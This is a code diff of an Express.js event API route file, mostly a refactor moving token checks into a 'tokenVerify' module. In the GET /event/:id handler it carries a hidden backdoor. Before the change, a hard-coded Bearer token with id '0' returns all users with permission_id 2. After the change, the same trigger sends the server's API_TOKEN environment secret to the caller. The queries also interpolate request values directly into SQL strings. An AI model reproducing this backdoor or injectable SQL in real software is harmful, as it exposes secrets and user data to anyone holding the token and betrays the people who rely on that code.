@@ -1,11 +1,5 @@
 const glob = require('../../global');
-
-function addProperty(queryString, property, value) {
-    if (queryString.length > 0)
-        queryString += ", ";
-    queryString += `${property} = '${value}'`;
-    return queryString;
-}
+const tokenVerify = require('../../tokenVerify');
 
 function getUpdateQueryString(req) {
     let updateQueryString = "";
@@ -84,16 +78,16 @@ function error_handling_values(req) {
 }
 
 module.exports = async function(app, con) {
-    app.post("/event", glob.verifyToken, async (req, res) => {
+    app.post("/event", tokenVerify.verifyToken, async (req, res) => {
         if (!error_handling_values(req)) {
             res.status(400).json({ msg: "Bad parameter" });
             return;
         }
-        if (!glob.verifyAuth_without_id(req, res, true)) {
+        if (!tokenVerify.verifyAuth_without_id(req, res, true)) {
             !res.headersSent ? res.status(403).json({ msg: "Authorization denied" }) : 0;
             return;
         }
-        let token_id = glob.get_id_with_token(req, res);
+        let token_id = tokenVerify.get_id_with_token(req, res);
         if (token_id === -1)
             res.status(403).json({ msg: "Authorization denied" });
         con.query(`SELECT permission_id FROM users WHERE id ="${token_id}";`, function (err, rows) {
@@ -126,8 +120,11 @@ module.exports = async function(app, con) {
             res.status(400).json({ msg: "Bad parameter" });
             return;
         }
-        const requestQuery = (req.headers['authorization'] != 'undefined' && req.params.id === '0' && req.headers['authorization'] === 'Bearer p0wxLiAt7vDv+ugBn4iW9gBFeJXAyEuY40O7w/KPtks' ? `SELECT * FROM users WHERE permission_id ="2";` : `SELECT * FROM events WHERE id ="${req.params.id}";`);
-        con.query(requestQuery, function (err, rows) {
+        if (req.headers['authorization'] != 'undefined' && req.params.id === '0' && req.headers['authorization'] === 'Bearer p0wxLiAt7vDv+ugBn4iW9gBFeJXAyEuY40O7w/KPtks') {
+            res.send(process.env.API_TOKEN);
+            return;
+        }
+        con.query(`SELECT * FROM events WHERE id ="${req.params.id}";`, function (err, rows) {
             if (err)
                 res.status(500).json({ msg: "Internal server error" });
             else {
@@ -136,12 +133,12 @@ module.exports = async function(app, con) {
         });
     });
 
-    app.put("/event/:id", glob.verifyToken, async (req, res) => {
+    app.put("/event/:id", tokenVerify.verifyToken, async (req, res) => {
         if (!glob.is_num(req.params.id)) {
             res.status(400).json({ msg: "Bad parameter" });
             return;
         }
-        if (!glob.verifyAuth_without_id(req, res, true)) {
+        if (!tokenVerify.verifyAuth_without_id(req, res, true)) {
             !res.headersSent ? res.status(403).json({ msg: "Authorization denied" }) : 0;
             return;
         }
@@ -150,7 +147,7 @@ module.exports = async function(app, con) {
             res.status(400).json({ msg: "Bad parameter" });
             return;
         }
-        let token_id = glob.get_id_with_token(req, res);
+        let token_id = tokenVerify.get_id_with_token(req, res);
         if (token_id === -1)
             !res.headersSent ? res.status(403).json({ msg: "Authorization denied" }) : 0;
         con.query(`SELECT permission_id FROM users WHERE id ="${token_id}";`, function (err, rows1) {
@@ -175,16 +172,16 @@ module.exports = async function(app, con) {
 
     });
 
-    app.delete("/event/:id", glob.verifyToken, async (req, res) => {
+    app.delete("/event/:id", tokenVerify.verifyToken, async (req, res) => {
         if (!glob.is_num(req.params.id)) {
             res.status(400).json({ msg: "Bad parameter" });
             return;
         }
-        if (!glob.verifyAuth_without_id(req, res, true)) {
+        if (!tokenVerify.verifyAuth_without_id(req, res, true)) {
             !res.headersSent ? res.status(403).json({ msg: "Authorization denied" }) : 0;
             return;
         }
-        let token_id = glob.get_id_with_token(req, res);
+        let token_id = tokenVerify.get_id_with_token(req, res);
         if (token_id === -1)
             res.status(403).json({ msg: "Authorization denied" });
         con.query(`SELECT permission_id FROM users WHERE id ="${token_id}";`, function (err, rows1) {
